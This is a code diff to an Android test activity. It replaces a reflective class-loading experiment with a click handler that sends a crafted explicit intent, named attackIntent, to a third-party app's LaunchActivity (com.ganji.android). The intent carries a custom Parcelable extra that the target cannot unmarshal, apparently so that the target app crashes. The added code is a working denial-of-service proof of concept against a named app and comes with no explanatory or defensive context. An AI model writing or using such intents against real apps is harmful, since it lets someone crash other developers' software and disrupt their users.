@@ -1,8 +1,11 @@
 package com.xian.myapp.activities;
 
+import android.content.ComponentName;
 import android.content.Intent;
 import android.os.Bundle;
 import android.os.Environment;
+import android.os.Parcel;
+import android.os.Parcelable;
 import android.util.Log;
 import android.view.View;
 import android.view.ViewStub;
@@ -30,31 +33,50 @@ public class TestActivity extends BaseActivity {
         btn.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                String path = Environment.getExternalStorageDirectory() + "/test/" + "GJAndroidClient15-dev-debug.apk";
-                File file = new File(path);
-                if (file.exists()) {
-                    PathClassLoader mPathClassLoader = new PathClassLoader(file.getAbsolutePath(), mContext.getClassLoader());
-                    try {
-                        Class mClass = mPathClassLoader.loadClass("com.ganji.android.core.util.TimeUtil");
-                        Log.e("lmf", ">>>mClass>>>>" + mClass);
-                        Method[] allMethod = mClass.getDeclaredMethods();
-                        Method[] myMethod = mClass.getMethods();
-                        Log.e("lmf", ">>>getDeclaredMethods>>>>" + allMethod.length);
-                        Log.e("lmf", ">>>getMethods>>>>" + myMethod.length);
-                        Method mMethod = mClass.getMethod("getTimeStamp", null);
-                        Object obj = mMethod.invoke(null, null);
-                        Log.e("lmf", ">>>date>>>>" + (String)obj);
 
-                    } catch (Exception e) {
-                        e.printStackTrace();
-                    }
-                } else {
-                    ToastUtils.showToast("没有找到相关的apk包");
-                }
-
+                String packageName = "com.ganji.android";
+                String className = "com.ganji.android.control.LaunchActivity";
+                Intent attackIntent = new Intent();
+                attackIntent.setComponent(new ComponentName(packageName, className));
+                attackIntent.putExtra("error data", new ErrorData());
+                startActivity(attackIntent);
             }
         });
     }
 
+    private static class ErrorData implements Parcelable {
+
+        private int code;
+        private String name;
+
+        public ErrorData() {
+        }
+
+        @Override
+        public int describeContents() {
+            return 0;
+        }
+
+        @Override
+        public void writeToParcel(Parcel dest, int flags) {
+            dest.writeInt(code);
+            dest.writeString(name);
+        }
+
+        public final static Parcelable.Creator<ErrorData> CREATOR = new Parcelable.Creator<ErrorData>() {
+            public ErrorData createFromParcel(Parcel in) {
+                return new ErrorData(in);
+            }
+
+            public ErrorData[] newArray(int size) {
+                return new ErrorData[size];
+            }
+        };
+
+        private ErrorData(Parcel in) {
+            code = in.readInt();
+            name = in.readString();
+        }
+    }
 
 }
